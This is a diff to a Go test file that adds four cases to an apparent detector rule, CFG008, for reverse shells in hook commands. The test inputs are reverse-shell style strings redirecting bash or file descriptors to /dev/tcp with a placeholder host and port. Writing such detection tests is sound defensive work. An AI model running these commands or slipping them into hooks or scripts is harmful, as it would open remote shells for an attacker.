@@ -177,3 +177,35 @@ func TestCFG008_DevTcpFdShell_Reported(t *testing.T) {
 		}
 	}
 }
+
+// Cover the 0>&1 heuristic branch (#1677).
+func TestCFG008_DevTcpZeroFd_Reported(t *testing.T) {
+	cmd := `curl /dev/tcp/h/p 0>&1`
+	if f := CFG008.Check(hookTarget(t, cmd)); len(f) == 0 {
+		t.Errorf("expected finding for %q, got none", cmd)
+	}
+}
+
+// Cover the >& /dev/tcp/ branch (#1677).
+func TestCFG008_DevTcpStdoutRedirect_Reported(t *testing.T) {
+	cmd := `bash >& /dev/tcp/h/p`
+	if f := CFG008.Check(hookTarget(t, cmd)); len(f) == 0 {
+		t.Errorf("expected finding for %q, got none", cmd)
+	}
+}
+
+// Cover the generic cat <&N | shell branch (#1677).
+func TestCFG008_DevTcpGenericCat_Reported(t *testing.T) {
+	cmd := `cat <&3 | bash /dev/tcp/h/p`
+	if f := CFG008.Check(hookTarget(t, cmd)); len(f) == 0 {
+		t.Errorf("expected finding for %q, got none", cmd)
+	}
+}
+
+// Cover the generic while read <&N branch (#1677).
+func TestCFG008_DevTcpGenericWhile_Reported(t *testing.T) {
+	cmd := `while read x <&3; do :; done # /dev/tcp/h/p`
+	if f := CFG008.Check(hookTarget(t, cmd)); len(f) == 0 {
+		t.Errorf("expected finding for %q, got none", cmd)
+	}
+}
